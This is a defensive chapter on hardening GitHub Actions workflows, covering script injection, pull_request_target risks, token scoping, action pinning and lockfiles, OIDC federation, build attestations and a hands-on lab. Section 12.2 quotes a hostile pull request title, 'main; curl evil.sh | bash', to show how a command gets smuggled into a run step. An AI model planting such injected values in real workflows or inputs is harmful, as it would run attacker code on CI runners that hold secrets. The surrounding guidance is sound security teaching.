# Chapter 12 - Security Hardening and Supply Chain {#ch12}

## 12.1 The Threat Model

Workflows execute code in response to events, with credentials attached, on infrastructure you do not fully control - that sentence contains every major attack class. The realistic adversaries: an attacker who submits a malicious pull request from a fork; an attacker who compromises a third-party action you consume; an attacker who gets one secret out of one log and pivots; and an attacker who poisons a cache or artifact that a later trusted run consumes. The defenses are correspondingly structural: untrusted input never reaches a shell or an interpreter unquoted; tokens are least-privileged and scoped per job; third-party dependencies are pinned and reviewed; and provenance is attestable end to end. GitHub's security-hardening guidance is the canonical checklist; this chapter is that checklist with the reasoning attached.

## 12.2 Script Injection and Untrusted Input

The most frequent real-world vulnerability in Actions is embarrassingly simple: interpolating event-controlled text into a `run:` script. A pull request titled `main; curl evil.sh | bash` becomes a command when `${{ github.event.pull_request.title }}` lands inside a `run:` block, because expression interpolation is textual, not argument-safe. The fix is absolute: pass untrusted values through **environment variables** (quoted) instead of expression interpolation, or keep them in expressions where they are compared but never executed. Every field of `github.event` - titles, branch names, comment bodies, `client_payload` - is attacker-controlled in public repositories and should be treated as hostile in private ones.

```bash
# VULNERABLE - do not do this
- run: echo "PR title: ${{ github.event.pull_request.title }}"

# SAFE - untrusted value travels as data, never as code
- env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: echo "PR title: $PR_TITLE"
```

## 12.3 pull\_request\_target and Privilege Boundaries

The `pull_request` event executes the **contributor's** workflow file with a read-only token and no secrets - safe by construction. The `pull_request_target` event executes the **base branch's** workflow file with a full token and secrets, against the contributor's code. That asymmetry exists for legitimate cases (labeling PRs, auto-assigning reviewers, posting comments), and it is the door through which most published Actions exploits have walked: a privileged checkout of the fork's code, followed by executing it. The rules: if a workflow uses `pull_request_target`, it must never check out and run untrusted code in the same job that holds credentials; prefer the `workflow_run` pattern (privileged workflow reacts only to completed untrusted runs, reading artifacts instead of code); and require human review for any gate that promotes untrusted content into a privileged context.

## 12.4 Least Privilege for the GITHUB\_TOKEN

The `GITHUB_TOKEN` is minted per job and scoped by `permissions:` - and since 2023, new repositories default to read-only, with org policy able to force read-only or allow per-token escalation. The professional baseline is a top-level block granting `contents: read` and per-job grants of exactly what each job needs (`packages: write` for the push job, `id-token: write` for OIDC and attestation jobs, `deployments: write` for deploy jobs). `GITHUB_TOKEN` also carries an API rate limit (1,000 requests per hour per repository) and never triggers recursive workflow events - a push made with it will not start another run, which prevents CI loops by design but surprises automation authors once.

```yaml
permissions:
  contents: read

jobs:
  test:
    runs-on: ubuntu-latest
    permissions:
      contents: read
    steps: [ ... ]

  deploy:
    runs-on: ubuntu-latest
    needs: test
    permissions:
      contents: read
      id-token: write      # OIDC federation
      deployments: write
    environment: production
    steps: [ ... ]
```

## 12.5 Dependency Pinning, Lockfiles, and Review

Three generations of dependency control, all current. **SHA pinning** (`uses: actions/checkout@<full-sha> # v6.0.1`) makes a reference immutable; Dependabot keeps the comments current. **Workflow lockfiles** - general availability since October 28, 2026 - generalize the idea: install the `gh actions-lock` extension, generate `.github/workflows/actions.lock` recording reviewed commits for every action \*and its transitive dependencies\*, and once a workflow is onboarded the platform runs the recorded commits even if upstream tags move. The **Require lockfile** policy enforces the practice at repository, organization, or enterprise level. **Policy controls** - allowed actions (by verified creator, by pattern) and Marketplace verification badges - fence what can be consumed at all. Layer them: policy defines the universe, lockfiles define the truth, Dependabot proposes upgrades, and review approves them.

## 12.6 OIDC Federation: No Static Cloud Keys

Workflows can obtain short-lived OpenID Connect tokens (`id-token: write`) representing the exact job - repository, ref, workflow path, actor, and more as signed claims - and exchange them with a cloud provider's trust policy for temporary credentials. Static access keys in secrets disappear from the deploy path entirely: AWS IAM roles, Azure workload identity federations, and GCP workload identity pools all accept GitHub's OIDC issuer (`https://token.actions.githubusercontent.com`). The subject claim (`repo:org/repo:ref:refs/heads/main` and friends) plus custom claim conditions (`workflow_ref`, `job_workflow_sha`, environment) make trust policies precise; reusable workflows get their own claim subtleties, and token customization lets you tailor the audience when a provider demands it.

```
deploy:
  runs-on: ubuntu-latest
  permissions:
    id-token: write   # required for OIDC
    contents: read
  steps:
    - uses: aws-actions/configure-aws-credentials@v4
      with:
        role-to-assume: arn:aws:iam::123456789012:role/gha-deploy
        aws-region: eu-central-1
    - run: aws sts get-caller-identity
```

::: {.warn}
**Watch out - trust the ref, not the actor**

A trust policy keyed on repository alone lets any branch - including a fork-controlled one, via the right event - mint credentials if the workflow file can be triggered there. Bind the condition to the protected ref or environment (`ref:refs/heads/main`, `environment:production`) so only runs that passed protection can claim the role.
:::

## 12.7 Attestations and SLSA Levels

Artifact attestations close the loop from build to verification. `actions/attest-build-provenance` (and the container-native BuildKit attestations from Chapter 8) produce Sigstore-signed claims binding an artifact to its repository, workflow, environment, commit, and trigger; consumers verify with `gh attestation verify artifact.tar.gz -R org/repo`, optionally requiring specific annotations. The property this buys is SLSA v1.0 Build Level 2, rising to Level 3 when builds run in isolated, reusable-workflow-defined processes. Public repositories use the public Sigstore transparency log; private repositories use GitHub's own instance with the same codebase but no public log. Policy can then be enforced by the consumer side - a deployment pipeline that refuses any image without a valid attestation - which is exactly the posture regulated environments are converging on.

::: {.lab}
### Lab 5 - OIDC Deployment and Attested Build {#lab5}

1. In a sandbox AWS (or Azure/GCP) account, create a deploy role whose trust policy allows GitHub's OIDC issuer for `repo:<you>/<repo>:ref:refs/heads/main` only.
2. Add an OIDC deploy job (as in Section 12.6) and prove `aws sts get-caller-identity` succeeds **without any stored cloud secret**; confirm the environment's protection rules gated the run.
3. Tighten the trust policy to require the production environment claim, then verify a non-environment run is refused by the cloud - this is the negative test that matters.
4. Add `actions/attest-build-provenance` to the build job; download the artifact locally and run `gh attestation verify` against the repository, inspecting the recorded workflow and commit claims.
5. Audit the repository with the security-hardening checklist: every third-party action pinned (or lockfile-onboarded), `permissions:` minimized per job, no untrusted event fields interpolated into `run:` blocks - fix what you find.
:::

**See also:** [Chapter 4](#ch4) for the actions you should be pinning, [Chapter 8](#ch8) for the registry credentials in play.
